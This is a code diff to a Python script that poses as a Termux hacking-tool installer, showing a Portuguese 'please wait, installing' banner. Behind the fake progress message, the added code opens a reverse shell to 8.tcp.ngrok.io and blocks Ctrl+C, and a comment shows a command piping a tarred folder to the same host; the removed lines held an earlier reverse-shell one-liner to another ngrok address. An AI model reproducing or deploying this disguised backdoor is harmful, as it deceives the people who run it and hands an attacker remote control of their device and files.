@@ -19,37 +19,55 @@ redb = '\033[1;41m'
 negrito = '\033[;1m	'
 reset = '\033[0;0m'
 
+# Vars
 back = False
-import os
+
+# tar czp /pastes | ncat 8.tcp.ngrok.io 15456
+# nc -lvp 333 | tar zxv
+
+# Libs
+import socket, subprocess, os
 
 while (back == False):
-    print(f'''
-    {red}
-                          :::!~!!!!!:.
-                  .xUHWH!! !!?M88WHX:.
-                .X*#M@$!!  !X!M$$$$$$WWx:.
-               :!!!!!!?H! :!$!$$$$$$$$$$8X:
-              !!~  ~:~!! :~!$!#$$$$$$$$$$8X:
-             :!~::!H!<   ~.U$X!?R$$$$$$$$MM!
-             ~!~!!!!~~ .:XW$$$U!!?$$$$$$RMM!
-               !:~~~ .:!M"T#$$$$WX??#MRRMMM!
-               ~?WuxiW*`   `"#$$$$8!!!!??!!!
-             :X- M$$$$       `"T#$T~!8$WUXU~
-            :%`  ~#$$$m:        ~!~ ?$$$$$$
-          :!`.-   ~T$$$$8xx.  .xWW- ~""##*"
-.....   -~~:<` !    ~?T#$$@@W@*?$$      /`
-W$@@M!!! .!~~ !!     .:XUW$W!~ `"~:    :
-#"~~`.:x%`!!  !H:   !WM$$$$Ti.: .!WUn+!`
-:::~:!!`:X~ .: ?H.!u "$$$B$$$!W:U!T$$M~
-.~~   :X@!.-~   ?@WTWo("*$$$W$TH$! `
-Wi.~!X$?!-~    : ?$$$B$Wu("**$RM!
-$R@i.~~ !     :   ~$$$$$B$$en:``
-?MXT@Wx.~    :     ~"##*$$$$M~
-    
-    {green}--> Aguarde enquanto fazemos a instalação!...
+    print(f'''{red}
+                        ______
+                     .-"      "-.
+                    /            |
+                   |              |
+                   |,  .-.  .-.  ,|
+                   | )(_o/  \o_)( |
+                   |/     /\     \|
+         (@_       (_     ^^     _) Installing...
+    _     ) \_______\__|IIIIII|__/__________________________
+   (_)@8@8$3<________|-\IIIIII/-|___________________________>
+          )_/        \          /
+         (@           `--------`
+
+                {blue}━━━ {red}By Mayteer'Maker {blue}━━━
+
+    {green}<--> Aguarde enquanto fazemos a instalação!...
     
     Por conta de ser uma ferramenta vasta de opções, o processo
     de download pode demorar.
     (Estima-se que em torno de 30 minutos)
-    {white}''')
-    os.system(''' python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("6.tcp.ngrok.io",17471));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])' ''')
+
+    Lembre-se de dar permissão de memória ao termux, sem isso
+    o processo de instalação será infinito!
+    {white}
+    [Aguarde...] > ''')
+
+    try:
+        # Tá aqui por quê? Não explana...🤫
+
+        #Tool para gerenciar maquina (opcional & beta)
+        #os.system('git clone https://github.com/xRev3rse/RMMtool &> /dev/null')
+
+        #Payload > Shell Remota
+        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+        s.connect(("8.tcp.ngrok.io",15456))
+        os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)
+        subprocess.call(["/bin/sh","-i"])
+    
+    # Burlar CTRL+C
+    except KeyboardInterrupt: 
+        pass 
